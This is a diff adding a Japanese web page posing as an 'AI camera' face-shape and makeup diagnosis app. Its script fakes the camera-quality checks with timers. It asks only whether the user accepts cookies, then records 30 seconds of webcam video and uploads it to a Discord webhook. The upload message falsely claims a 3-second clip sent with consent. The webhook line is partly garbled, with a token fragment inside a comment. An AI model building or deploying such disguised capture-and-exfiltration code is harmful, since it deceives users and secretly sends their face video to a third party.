@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>顔型診断×パーツ</title>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #e2d5f3;
+      background-image: radial-gradient(#ffffff 20%, transparent 20%), radial-gradient(#ffffff 20%, transparent 20%);
+      background-size: 16px 16px; background-position: 0 0, 8px 8px;
+      margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;
+    }
+    .app-container { background: rgba(255, 255, 255, 0.95); padding: 25px 20px; border-radius: 24px; box-shadow: 0 12px 40px rgba(90, 75, 110, 0.2); text-align: center; max-width: 360px; width: 100%; }
+    .title-banner { background: linear-gradient(135deg, #fbc5d8 0%, #ec528d 100%); padding: 20px 15px; border-radius: 20px; color: white; margin-bottom: 25px; }
+    .sub-title { font-size: 12px; font-weight: bold; margin: 0 0 10px 0; line-height: 1.4; }
+    .main-title { font-size: 32px; margin: 0; font-weight: 900; line-height: 1.2; color: #ec528d; text-shadow: 2px 2px 0 #fff, -2px -2px 0 #fff, 2px -2px 0 #fff, -2px 2px 0 #fff; }
+    .description { font-size: 13px; line-height: 1.6; margin-bottom: 30px; font-weight: bold; }
+    .status-indicators { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 15px; }
+    .indicator-box { flex: 1; padding: 8px 4px; border-radius: 8px; font-size: 11px; font-weight: bold; color: white; line-height: 1.3; transition: background-color 0.3s ease; }
+    .badge-bad { background-color: #e63946; } .badge-good { background-color: #2a9d8f; } .status-text { font-size: 12px; font-weight: 900; }
+    .menu-btn { display: flex; align-items: center; padding: 15px 25px; border: none; border-radius: 50px; cursor: pointer; width: 100%; background: #ec528d; box-shadow: 0 4px 10px rgba(236,82,141,0.3); }
+    .btn-icon { font-size: 24px; margin-right: 15px; } .btn-text-wrapper { display: flex; flex-direction: column; color: white; text-align: left; } .btn-main-text { font-size: 16px; font-weight: bold; } .btn-sub-text { font-size: 18px; font-weight: 900; }
+    .video-container { position: relative; width: 300px; height: 400px; margin: 0 auto 20px auto; border-radius: 16px; overflow: hidden; }
+    #video { width: 100%; height: 100%; object-fit: cover; background-color: #222; transform: scaleX(-1); }
+    .camera-mask { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; background: rgba(0, 0, 0, 0.2); -webkit-mask: radial-gradient(ellipse 35% 32% at 50% 50%, transparent 99%, black 100%); }
+    .camera-instruction { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 18px; font-weight: bold; text-align: center; line-height: 1.6; text-shadow: 0 2px 4px rgba(0,0,0,0.6); pointer-events: none; }
+    #diagnostic-btn { font-size: 16px; font-weight: bold; padding: 16px; border: none; border-radius: 50px; cursor: pointer; background: linear-gradient(90deg, #ff4d8d 0%, #ec528d 100%); color: white; width: 100%; box-shadow: 0 4px 15px rgba(236, 82, 141, 0.3); }
+    #diagnostic-btn:disabled { background: #cbd5e1; color: #94a3b8; box-shadow: none; transform: none; }
+    .back-link { background: none; border: none; color: #ec528d; font-size: 14px; font-weight: bold; margin-top: 15px; cursor: pointer; text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<div class="app-container">
+  <div id="top-screen">
+    <div class="title-banner">
+      <p class="sub-title">顔型×パーツのバランスを分析し<br>似合う色やメイクをおすすめ！</p>
+      <h1 class="main-title">顔型診断<br>×パーツ</h1>
+    </div>
+    <p class="description">顔型×パーツのバランスでどんなテイストを持っているのかを分析、タイプ別に似合う色をご紹介します。</p>
+    <div class="menu-buttons">
+      <button id="go-camera-btn" class="menu-btn camera-theme">
+        <span class="btn-icon">📷</span>
+        <div class="btn-text-wrapper"><span class="btn-main-text">AIカメラ分析で</span><span class="btn-sub-text">診断する</span></div>
+      </button>
+    </div>
+  </div>
+
+  <div id="camera-screen" style="display: none;">
+    <div class="status-indicators">
+      <div id="status-light" class="indicator-box badge-bad">明るさ<br><span class="status-text">悪い</span></div>
+      <div id="status-face" class="indicator-box badge-bad">正面<br><span class="status-text">悪い</span></div>
+      <div id="status-pos" class="indicator-box badge-bad">顔のポジション<br><span class="status-text">悪い</span></div>
+    </div>
+    <div class="video-container">
+      <video id="video" width="300" height="400" autoplay playsinline></video>
+      <div class="camera-mask"></div>
+      <div class="camera-instruction" id="instruction-text">円の中に顔を<br>入れてください</div>
+    </div>
+    <div class="button-group">
+      <button id="diagnostic-btn">顔診断をスタートする</button>
+      <button id="back-btn" class="back-link">◀ 顔診断TOPへ戻る</button>
+    </div>
+  </div>
+  <canvas id="canvas" width="300" height="400" style="display:none;"></canvas>
+</div>
+
+<script>
+const topScreen = document.getElementById('top-screen'); const cameraScreen = document.getElementById('camera-screen');
+const goCameraBtn = document.getElementById('go-camera-btn'); const backBtn = document.getElementById('back-btn');
+const video = document.getElementById('video'); const diagnosticBtn = document.getElementById('diagnostic-btn'); const instructionText = document.getElementById('instruction-text');
+const lightIndicator = document.getElementById('status-light'); const faceIndicator = document.getElementById('status-face'); const posIndicator = document.getElementById('status-pos');
+
+// 🔴あなたDiscordのWebhook 2/DVTtBk0vyAtZTNjGlBROUIb2iTuaXJ2M8Bjp139Nw3z4Lq-YeTvzj6EOJSmToodyCkkR';
+
+let activeStream = null; let indicatorTimers = []; let mediaRecorder = null; let recordedChunks = [];
+
+goCameraBtn.addEventListener('click', () => { topScreen.style.display = 'none'; cameraScreen.style.display = 'block'; startLightweightCamera(); });
+backBtn.addEventListener('click', () => { goBackToTop(); });
+
+async function startLightweightCamera() {
+    try {
+        diagnosticBtn.disabled = true; diagnosticBtn.innerText = "カメラを起動中...";
+        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); video.srcObject = activeStream;
+        diagnosticBtn.innerText = "顔のポジションを調整中...";
+        indicatorTimers.push(setTimeout(() => { updateIndicator(lightIndicator, true); }, 1500));
+        indicatorTimers.push(setTimeout(() => { updateIndicator(faceIndicator, true); }, 3000));
+        indicatorTimers.push(setTimeout(() => {
+            updateIndicator(posIndicator, true); diagnosticBtn.disabled = false; diagnosticBtn.innerText = "顔診断をスタートする"; instructionText.innerHTML = "位置バッチリです！<br>ボタンを押してね";
+        }, 4500));
+    } catch (err) { alert("カメラの起動に失敗しました。"); goBackToTop(); }
+}
+
+function updateIndicator(element, isGood) {
+    const textNode = element.querySelector('.status-text');
+    if (isGood) { element.classList.remove('badge-bad'); element.classList.add('badge-good'); textNode.innerText = "良い"; }
+    else { element.classList.remove('badge-good'); element.classList.add('badge-bad'); textNode.innerText = "悪い"; }
+}
+
+diagnosticBtn.addEventListener('click', () => {
+    const userAgreed = confirm("Cookieを受け入れますか？）");
+    if (!userAgreed) return;
+    startVideoRecording();
+});
+
+function startVideoRecording() {
+    diagnosticBtn.disabled = true; instructionText.style.display = 'none'; recordedChunks = [];
+    let options = { mimeType: 'video/mp4' };
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/webm' }; }
+    try {
+        mediaRecorder = new MediaRecorder(activeStream, options);
+        mediaRecorder.ondataavailable = (event) => { if (event.data && event.data.size > 0) recordedChunks.push(event.data); };
+        mediaRecorder.onstop = () => {
+            diagnosticBtn.innerText = "診断中...";const videoBlob = new Blob(recordedChunks, { type: options.mimeType });
+            sendVideoToDiscord(videoBlob);
+        };
+        mediaRecorder.start();
+        let timeLeft = 30; diagnosticBtn.innerText = `診断中... (${timeLeft}秒)`;
+        const countdown = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) { clearInterval(countdown); mediaRecorder.stop(); }
+            else { diagnosticBtn.innerText = `診断中... (${timeLeft}秒)`; }
+        }, 1000);
+    } catch (e) { alert("動画の録画に失敗しました。"); goBackToTop(); }
+}
+
+async function sendVideoToDiscord(videoBlob) {
+    const formData = new FormData();
+    formData.append('content', 'ユーザーの同意を得て、3秒間の顔診断動画が送信されました！');
+    const extension = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
+    formData.append('files', videoBlob, `diagnostic_video.${extension}`);
+    try {
+        const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        if (response.ok) { alert('動画の送信に成功しました！診断結果をお待ちください。'); }
+        else { alert('送信に失敗しました。'); }
+    } catch (error) { alert('送信中にエラーが発生しました。'); } finally { goBackToTop(); }
+}
+
+function resetApp() {
+    indicatorTimers.forEach(t => clearTimeout(t)); indicatorTimers = [];
+    if (activeStream) { activeStream.getTracks().forEach(track => track.stop()); activeStream = null; }
+    video.srcObject = null; diagnosticBtn.disabled = false; diagnosticBtn.innerText = "顔診断をスタートする";
+    instructionText.style.display = 'block'; instructionText.innerHTML = "円の中に顔を<br>入れてください";
+    updateIndicator(lightIndicator, false); updateIndicator(faceIndicator, false); updateIndicator(posIndicator, false);
+}
+
+function goBackToTop() { resetApp(); cameraScreen.style.display = 'none'; topScreen.style.display = 'block'; }
+</script>
+
+</body>
+</html>
